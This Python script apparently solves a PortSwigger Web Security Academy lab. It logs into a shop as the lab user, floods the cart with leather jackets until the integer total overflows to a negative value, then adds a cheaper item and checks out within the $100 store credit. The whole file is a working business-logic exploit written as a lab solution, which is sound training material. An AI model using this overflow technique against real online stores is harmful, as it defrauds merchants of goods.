import typer
import requests
from lxml import html
from rich.console import Console
from rich.table import Table
from collections import namedtuple

console = Console()

STORE_CREDIT = 100 #dollars available in our wallet
JACKET_PRODUCT_ID = 1 #leather jacket ID
SERVER = 'https://' #Server URL to compose
INT_MAX = 2147483647 #couldn't set maxint constraint because it's not supported anymore by the newest python interpreters
JACKET_PRICE_IN_CENTS = 133700 #price of a single leather jacket, the object we want to buy 
MAX_QTY_PER_REQUEST = 99 #max quantity a user can buy in one time 

Product = namedtuple("Product", "name price id")

#utility method to fetch csrf tokens when required
def fetch_csrf_token(session, endpoint): 
    response = session.get(f"{SERVER}/{endpoint}")
    console.log(f"Status code for csrf token request= {response.status_code}")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//input[@name='csrf']/@value")[0]
    return csrf_token

#checkout method at the end of our attack
def checkout(session):
    csrf_token = fetch_csrf_token(session,'cart')
    response = session.post(f"{SERVER}/cart/checkout", data={
        "csrf": csrf_token,
    })
    console.log(f"Status code for checkout request= {response.status_code}")
    return response

#parsing all products with their names, prices and ids to be inserted into the table 
def parse_product(product):
    product_name = product.xpath('h3')[0].text
    product_price = float(product.xpath('img')[1].tail.strip().replace("$",""))
    product_id = product.xpath("a[@class='button']/@href")[0].split('=')[1]
    return Product(product_name, product_price, product_id)

#login method to access profile and be able to add products to cart
def login(session):
    response = session.get(f'{SERVER}/login')
    console.log(f'Status code {response.status_code}')
    document = html.fromstring(response.content)
    csrf_token = fetch_csrf_token(session,'login')
    console.log(f'CSRF token obtained: {csrf_token}')
    response = session.post(f"{SERVER}/login", data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter",
    })
    if (response.status_code == 200):
        console.log('Login successful')

#fetches all products available on the site 
def fetch_products(session):
    res = []
    
    response = session.get(f'{SERVER}')
    console.log(f'Status code {response.status_code}')
    document = html.fromstring(response.content)
    products = document.xpath("//section[@class='container-list-tiles']/div")
    res += [parse_product(product) for product in products]
    return res

#utility method to add a single product with its own qty 
def add_prod_to_cart(session,id,quantity):
    response = session.post(f'{SERVER}/cart', data = {
            "productId": id,
            "redir": "PRODUCT",
            "quantity": quantity
        })
    console.log(f"Status code for adding {quantity} pieces of product {id} to the cart request= {response.status_code}")

#utility method to retrieve the total amount to pay
def fetch_total(session):
    response = session.get(f'{SERVER}/cart')
    console.log(f'Status code for fetching total amount to pay request= {response.status_code}')
    document = html.fromstring(response.content)
    total = document.xpath("//div[@class='container is-page']/table[2]/tbody/tr/th[2]")[0].text.split('.')[0]
    total_int=int(total.replace('$',''))
    return total_int

#utility method to compose the table of products with all their data
def products_table(products):
    table = Table(title="Products")
    table.add_column("Name")
    table.add_column("Price")
    table.add_column("ID")
    
    for product in products:
        table.add_row(product.name, str(product.price), product.id)
    return table

#retrieves the second most expensive product
def second_most_expensive_prodId(products):
    price_max=0
    second_prod=()

    for i in range(1,len(products)):
        if products[i].price > price_max:
            price_max = products[i].price
            second_prod = products[i]

    return second_prod

#method that floods the cart with 99 jackets before and the remaining amount right after 
def flood_the_cart(session,id):
    times_to_add_jacket = int((INT_MAX*2)/(JACKET_PRICE_IN_CENTS)) #calculate how many times the price of a single jacket is contained in double the INT_MAX 
    #(negative and positive portion)

    times = int(times_to_add_jacket / MAX_QTY_PER_REQUEST) #the integer part of the division is the total times we must add 99 jackets to reach a negative amount 

    remaining_qty = (times_to_add_jacket % MAX_QTY_PER_REQUEST) #the remainder is the total quantity we have to add in the end to reach the said amount 

    for i in range (0,times):
            add_prod_to_cart(session,id,MAX_QTY_PER_REQUEST)
    add_prod_to_cart(session,id,remaining_qty)


#floods the cart with the second most expensive product under 100 dollars
def flood_one_more_time(session, products, total_amount):
    sec_prod = second_most_expensive_prodId(products)  #retrieve the second most expensive product
        
    times_to_add_second_prod = int((-total_amount + STORE_CREDIT)/(sec_prod.price)) #calculate the times the price of this product is contained in the range (-total_amount + STORE CREDIT) 
    #the integer part of the division is the number of times we must add 1 piece of the second most expensive product to reach the intended amount
    
    for i in range(0,times_to_add_second_prod): 
        add_prod_to_cart(session,sec_prod.id,1)

#composes the URL to connect to 
def init_connection(sid):
    global SERVER
    url = sid + '.web-security-academy.net'
    SERVER += url

def main(sid:str):

    console.log("About to setup server connection...")
    init_connection(sid)

    console.log('About to start a new attack session...')
    session = requests.Session()
    with console.status("Login attempt"):
        login(session)     

    with console.status('Let\'s look at what we have here'):
        products = fetch_products(session)
        console.print(products_table(products))

    with console.status('Flooding the cart...'):
        flood_the_cart(session, JACKET_PRODUCT_ID)

    with console.status('Let\'s see how much we have to pay now'):
        total_amount = fetch_total(session)
        console.log(f'TO PAY: {total_amount}')
    
    with console.status('Negative price... adding the most expensive product that\'s under 100 dollars to the cart in order to finally checkout'):
        flood_one_more_time(session, products, total_amount)
        console.log(f'TO PAY NOW: {fetch_total(session)}')

    with console.status('Finalizing the attack...'):
        response=checkout(session)
        if response.status_code == 200:
            console.log('Challenge completed')

if __name__ == "__main__":
    typer.run(main)